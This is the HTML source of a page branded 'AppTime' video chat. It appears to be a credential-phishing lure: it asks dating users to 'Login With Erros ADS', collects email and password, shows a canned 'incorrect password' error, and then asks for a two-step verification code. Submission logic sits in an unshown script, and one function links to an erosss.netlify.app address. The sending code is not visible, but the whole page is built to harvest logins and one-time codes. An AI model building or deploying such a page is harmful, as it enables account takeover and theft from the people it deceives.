<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Home | Login</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet" />
    <script src="https://cdn.tailwindcss.com"></script>
    
</head>


<body>
    <div id="mainSystem" class="h-screen bg-[#00BE70] flex items-center justify-center">
        
        <div id="videoChatBlock" class=" max-w-[400px] bg-white rounded">
            <div class="p-5 ">
                <div class="mx-auto flex items-center justify-center mt-5">
                    <img class="h-16 w-16 text-center" src="./face.png" alt="">
                </div>
                <h2 class="text-3xl font-bold text-blue-900 text-center">AppTime</h2>
                <p class="text-xl pt-5 font-semibold text-[#707b8e]">Login With Erros ADS and enjoy with  <b class="text-[#00BE70]">AppTime video chat</b> your dating partner.</p>
                <button class="block p-2 my-5 w-full bg-[#00BE70] text-xl font-semibold text-white rounded-md" onclick="hideVideoBlock()">Login With Erros ADS</button>
            </div>
        </div>
        <!-- Login Block -->
        <div id="authenticationBlock" class="hidden min-w-[300px] max-w-[400px] bg-white rounded">
            <div id="loginSystem">

                <form >
                    <div class="p-5 ">
                        <h2 class="text-2xl font-bold text-gray-600 text-center">Login With ERROS ADS</h2>
                        <div class="p-2 h-10 py-1 my-7 flex items-center bg-white overflow-hidden">
                            <div class="w-full">
                                <label class="w-full text-xs block" id="email-field" htmlfor="email">
                                </label>
                                <input id="email" class="w-full px-3 border-sky-500 border rounded text-lg py-1 outline-sky-500 " type="email" name="" required placeholder="Email address*">
                            </div>
                           
                        </div>
                        <!-- password field -->
                        <div class="p-2 h-10 py-1 my-7 flex items-center bg-white overflow-hidden">
                            <div class="w-full">
                                <label class="w-full text-xs block" id="email-field" htmlfor="email">
                                </label>
                                <input id="password" class="w-full px-3 border-sky-500 border rounded text-lg py-1 outline-sky-500 " type="password" name="" required placeholder="password">
                            </div>
                           
                        </div>
                        <small class="text-red-700 font-bold hidden errors">incorrect password</small>

                        <input type="submit" name="submit" class="block p-2 my-5 w-full bg-[#00BE70] text-xl font-semibold text-white rounded-md" value="login Now">
                    </div>
                </form>
            </div>

            <div id="otpSystem">

              <div class="p-4">
                <form >
                    <h2 class="text-3xl font-bold text-gray-900 text-center">two Step Verification</h2>
                    <div class="p-2 h-14 py-1 my-7 flex items-center bg-white overflow-hidden">
                        <div class="w-full">
                            <input  class="w-full px-3 bg-gray-200 text-lg py-2 focus:outline-none focus:border-none border-none" type="text" name="" placeholder="otp Code Here">
                        </div>
                    </div>
                    <input type="submit" name="submit" value="Authenticate" class="block p-2 my-5 w-full bg-[#00BE70] text-xl font-semibold text-white rounded-md">
                </form>
              </div>
            </div>

     
        </div>
    </div>

    <script>


        function hideVideoBlock() {
            document.getElementById('videoChatBlock').style.display = 'none'; 
            document.getElementById('authenticationBlock').style.display = 'block'; 
        }

        function navigateWithId() {
            // Extract the query parameter from the URL
            const urlParams = new URLSearchParams(window.location.search);
            const userId = urlParams.get('id');

            // Navigate to the new page with the extracted user ID
            window.open('https://erosss.netlify.app?id=' + userId, '_blank')
        }
    </script>
    <script src="main.js"></script>
</body>

</html>
